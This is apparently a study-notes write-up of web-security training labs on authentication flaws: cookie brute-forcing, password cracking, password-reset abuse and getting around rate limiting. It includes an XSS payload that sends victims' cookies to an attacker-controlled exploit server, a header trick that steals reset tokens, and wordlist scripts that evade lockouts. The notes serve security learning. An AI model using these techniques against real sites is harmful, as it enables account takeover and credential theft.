# AUTHENTICATION VULNERABILITIES

---

<img width="1057" height="258" alt="image" src="https://github.com/user-attachments/assets/e61107a1-529a-4e90-8595-181414b6ed84" />


<img width="1038" height="312" alt="image" src="https://github.com/user-attachments/assets/d16cfa80-59c1-498e-b2c7-c4c44fda17e3" />


<img width="1029" height="299" alt="image" src="https://github.com/user-attachments/assets/99bfb7ad-75dd-4aab-a64e-555bb4fb3f47" />


//Lab: Brute-forcing a stay-logged-in cookie

- log in as wiener:peter with stay logged in box checked
- notice we'd get the stay-logged-in cookie
- notice it looks base64 encoded -- use decoder and found that it's `wiener:<hash>`
- the hash looks like md5 -- try and crack it on crackstation and yes it's md5 `peter`
- so: `base64(<user> : <md5hash>)`
- on burp send /login request to intruder
- change id to carlos -- set password as target param --  paste payload list
- set payload processing accordingly and sequentially -- 1. hash md5 -- 2. add prefix carlos: -- 3. base64 encode
- then we get 200 OK on the successful login attempt

---

<img width="1081" height="172" alt="image" src="https://github.com/user-attachments/assets/ca22ae63-b8b8-4984-ba17-7d2068f7b138" />


//Lab: Offline password cracking


- try XSS on the comment form
- try this payload with the url of our exploit server

```
<script>document.location='https://exploit-0a1b008404dfb351808e029001800001.exploit-server.net/'+document.cookie</script>
```

- and got a hit on our exploit server log
  
<img width="1536" height="432" alt="image" src="https://github.com/user-attachments/assets/ca8052f0-4816-4e96-834d-bfd78f030b96" />

- use burp decoder

<img width="684" height="277" alt="image" src="https://github.com/user-attachments/assets/3bccf8a5-9fed-48f3-8c56-eabbf618606e" />

- then crack the hash on crackstation.net

<img width="966" height="279" alt="image" src="https://github.com/user-attachments/assets/24eab12c-7011-4880-a123-84bef77c08bb" />

- then login with `carlos : onceuponatime`
- and delete account

---


<img width="1010" height="256" alt="image" src="https://github.com/user-attachments/assets/c93694ba-76f5-4423-969f-773c5fed44c3" />


<img width="1086" height="300" alt="image" src="https://github.com/user-attachments/assets/d34ce0eb-1821-410a-9f37-0d937786b0cd" />


<img width="1071" height="278" alt="image" src="https://github.com/user-attachments/assets/e04560b2-576e-41a8-82b8-897ecb64e240" />


<img width="1115" height="346" alt="image" src="https://github.com/user-attachments/assets/7d296399-890f-4cdc-b0f0-8855ca78b7c7" />


//Lab -- password reset broken logic

- check our email for our exploit server

`wiener@exploit-0a43002f034e9138805dc09f01e60087.exploit-server.net`

- now click on `forget password` and type in our email
- in our email client we get an email with a link to reset password
- try and reset our password
- it redirects
- try and log in with our new password and it works

<img width="928" height="417" alt="image" src="https://github.com/user-attachments/assets/668efed3-84c4-400b-8804-4cfc56779a18" />


- now from the earlier POST request `/forgot-password?temp-forgot-password-token=30lrllg39e1avwc5wgds6dylu45q5j7ua`
- swap in our new password and username carlos
- it redirects
<img width="989" height="431" alt="image" src="https://github.com/user-attachments/assets/d26d56a4-d265-4975-8b06-521a1c76f196" />


- log in with `carlos : tools`
- and lab solved

<img width="1180" height="662" alt="image" src="https://github.com/user-attachments/assets/a5f40130-300d-43bd-9b6a-4ca6d3746ede" />


---

<img width="1010" height="151" alt="image" src="https://github.com/user-attachments/assets/db43c8e8-f08a-47b0-8ccb-91c9cb618778" />



//Lab -- password reset poisoning via middleware


- log in with `wiener : peter`
- check our email for our exploit server -- `wiener@exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net`
- log out and click on the `forgot password` endpoint
- try and reset our password -- got a link in our email -- click on the link -- confirmed that we can successfully reset our password
- now on repeater -- try and add `X-Forwarded-Host: https://exploit-0ac900a503d5471c80df709101f000bb.exploit-server.net` to the request header of `/forgot-password` endpoint
- also use `carlos` as value in the username param

<img width="1248" height="406" alt="image" src="https://github.com/user-attachments/assets/b8e6c0b9-f553-4404-93d9-f2b250448b1c" />


- check our log in the exploit server and find the password reset token for carlos

<img width="1286" height="93" alt="image" src="https://github.com/user-attachments/assets/cc317e0e-01e2-4b0e-b5ec-de335822dce6" />

- now send the `/forgot-password?temp-forgot-password-token=<token>` endpoint where we actually reset password to repeater
- swap in the stolen token we got just now for carlos both in the request body and the actual query string up top
- also change the password param to our newly chosen password `tools` -- send it

<img width="1247" height="436" alt="image" src="https://github.com/user-attachments/assets/a34921d5-feb4-4e5c-ba01-ada105d1245a" />

- now try and log in with our new creds `carlos : tools`
- and lab solved

<img width="1211" height="665" alt="image" src="https://github.com/user-attachments/assets/ffa6e346-373c-438f-9653-8405982bcc3f" />

** LESSON LEARNED
- always try the `x-forwarded-host` header!

---

<img width="1042" height="282" alt="image" src="https://github.com/user-attachments/assets/1accfa8a-cacd-4315-a052-7a36e6624659" />


//Lab: Password brute-force via password change

- log in with `wiener : peter`
- try and change new password
- in repeater, experiment around and observe that invalid creds would cause 'current password is incorrect error'
- however, if we use valid creds but with 2 different new passwords -- we get 'new passwords do not match' error
- which we can use to identify carlos' password

<img width="1251" height="411" alt="image" src="https://github.com/user-attachments/assets/4e82edf4-e20b-4610-aaec-5590472cc5f3" />

- send request to intruder
- set pitchfork attack
- set up 2 payloads
- NOTE that we need for every third request to be correct credentials to prevent rate limiting and potential IP ban
- first payload for username param
- to create username-wordlist `python3 -c "for _ in range(50): print('carlos\ncarlos\nwiener')"`

<img width="450" height="457" alt="image" src="https://github.com/user-attachments/assets/47f29eaa-ed92-427a-bc85-75767413062a" />

- second payload for current-password param
- to create password-wordlist
```
with open("wordlist.txt") as f:
    words = [line.strip() for line in f]

interleaved = []
for i, word in enumerate(words):
    interleaved.append(word)
    if (i + 1) % 2 == 0:  # After every 2 candidate passwords, insert valid password
        interleaved.append("peter")

with open("interleaved_passwords.txt", "w") as f:
    f.write("\n".join(interleaved))

```

<img width="449" height="451" alt="image" src="https://github.com/user-attachments/assets/d3032413-6d7d-46f3-b572-58d94e63b07b" />


- now make sure that the two new passwords params have different values -- to trigger `new passwords do not match` error

<img width="1552" height="443" alt="image" src="https://github.com/user-attachments/assets/c0cff5f7-0607-4097-8403-cd6dd8ad2f1a" />


- start the attack and after a few seconds, we found a potential match `carlos : master`

<img width="1173" height="770" alt="image" src="https://github.com/user-attachments/assets/73fb3731-cc31-410a-a13f-178f62252ceb" />


- log in as `carlos : master`
- lab solved

<img width="1050" height="446" alt="image" src="https://github.com/user-attachments/assets/134c81e9-4cb3-47c5-a883-6425a5712081" />













































